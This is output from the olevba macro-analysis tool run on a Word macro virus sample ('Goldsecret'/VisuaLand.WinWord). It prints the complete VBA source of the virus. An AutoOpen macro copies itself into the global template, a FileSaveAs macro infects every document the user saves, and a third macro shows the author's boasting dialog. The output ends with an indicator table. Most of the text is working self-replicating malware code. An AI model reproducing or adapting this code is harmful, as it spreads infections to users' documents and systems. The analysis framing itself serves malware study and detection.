olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goldsecret-84cf487b1a85a59d0b4fb3dda3a98bdd422f213c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goldsecret-84cf487b1a85a59d0b4fb3dda3a98bdd422f213c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Goldsecret-84cf487b1a85a59d0b4fb3dda3a98bdd422f213c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim bTooMuchTrouble
Dim bTooMuchError
Dim Mikrodata
Dim sMe$
Dim sMacro$

    iMacroCount = WordBasic.CountMacros(0, 0)

    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "VisuaLand" Then
            bInstalled = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
            bTooMuchTrouble = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "AutoOpen" Then
            bTooMuchError = -1
        End If
    Next i

    If Not bInstalled And Not bTooMuchTrouble And Not bTooMuchError Then

    WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=13, Category:=2, Name:="VisuaLand", Menu:="&Help", AddBelow:="&About Microsoft Word...", MenuText:="About &VisuaLand Technology GoldSecret...", Add:=1, Context:=0

        Mikrodata = WordBasic.Val(WordBasic.[GetDocumentVar$]("Mikrodata"))
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":VisuaLand"
        WordBasic.MacroCopy sMacro$, "Global:VisuaLand", 1
        sMacro$ = sMe$ + ":FileSaveAs"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
        sMacro$ = sMe$ + ":AutoOpen"
        WordBasic.MacroCopy sMacro$, "Global:AutoOpen", 1
        WordBasic.SetProfileString "MD97", Str(Mikrodata + 1)
        WordBasic.MsgBox "The Full Powered by VisuLand Technology"
    End If

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Goldsecret-84cf487b1a85a59d0b4fb3dda3a98bdd422f213c - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim sMe$
Dim sTMacro$

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Abort
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg

    If dlg.Format = 0 Then dlg.Format = 1
    sMe$ = WordBasic.[FileName$]()

    sTMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 1
    sTMacro$ = sMe$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$, 1
    sTMacro$ = sMe$ + ":VisuaLand"
    WordBasic.MacroCopy "Global:VisuaLand", sTMacro$, 1
    WordBasic.FileSaveAs dlg
    GoTo Done

Abort:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VisuaLand.bas 
in file: Virus.MSWord.Goldsecret-84cf487b1a85a59d0b4fb3dda3a98bdd422f213c - OLE stream: 'Macros/VBA/VisuaLand'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()

WordBasic.BeginDialog 588, 338, "About VisuaLand Technology..."
    WordBasic.PushButton 152, 299, 301, 21, "Milky Wahyudi Widjaya - VisuaLand", "Push1"
    WordBasic.Text 16, 199, 554, 13, "OK,  Concept  was  updated,  please  look  VisuaLand.Winword.  I  hope", "Text18"
    WordBasic.Text 16, 218, 560, 13, "you easy study again, because VisuaLand is the best virii in 1997. If you have", "Text19"
    WordBasic.Text 16, 237, 553, 13, "have any comment, please email to me: visualand@visualand.com, bye...", "Text20"
    WordBasic.Text 16, 256, 35, 1, "", "Text21"
    WordBasic.Text 16, 263, 268, 1, "", "Text22"
    WordBasic.Text 13, 270, 559, 13, "VisuaLand Technology CyberWorld WebSite in http://www.visualand.com", "Text24"
    WordBasic.Text 16, 282, 559, 1, "", "Text23"
    WordBasic.Text 133, 16, 357, 13, "Welcome to VisuaLand Technology GoldSecret", "Text1"
    WordBasic.Text 169, 35, 357, 1, "", "Text2"
    WordBasic.Text 19, 43, 548, 13, "VisuaLand Technology is a member in Internet, about research && creator", "Text4"
    WordBasic.Text 19, 62, 557, 13, "virii. We are the first creator virii (Document MS-Word). Concept virii,  is ", "Text7"
    WordBasic.Text 19, 81, 559, 13, "the my research. Concept is not wild, but Concept only for tutorial,  how ", "Text8"
    WordBasic.Text 19, 100, 555, 13, "to create some virii in Microsoft Word. It's illegal to use baby...", "Text9"
    WordBasic.Text 19, 119, 35, 1, "", "Text10"
    WordBasic.Text 19, 126, 35, 1, "", "Text12"
    WordBasic.Text 19, 133, 35, 1, "", "Text13"
    WordBasic.Text 19, 140, 35, 1, "", "Text14"
    WordBasic.Text 19, 138, 35, 1, "", "Text11"
    WordBasic.Text 45, 61, 35, 1, "", "Text6"
    WordBasic.Text 45, 61, 35, 1, "", "Text5"
    WordBasic.Text 169, 54, 35, 1, "", "Text3"
    WordBasic.Text 17, 129, 562, 13, "Some people said that first WordMacro virus was created by  McNamara, ", "Text15"
    WordBasic.Text 17, 148, 565, 13, "but it's bullshit. Concept was created by Milky Wahyudi Widjaya (PresDir", "Text16"
    WordBasic.Text 17, 167, 569, 13, "of VisuaLand Technology). from Jakarta - Indonesia. It's my GoldSecret!", "Text17"
WordBasic.EndDialog

Dim VisuaLand As Object: Set VisuaLand = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog VisuaLand

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.visualand|URL                                          |
|          |.com                |                                             |
|Base64    |0?{                 |MD97                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

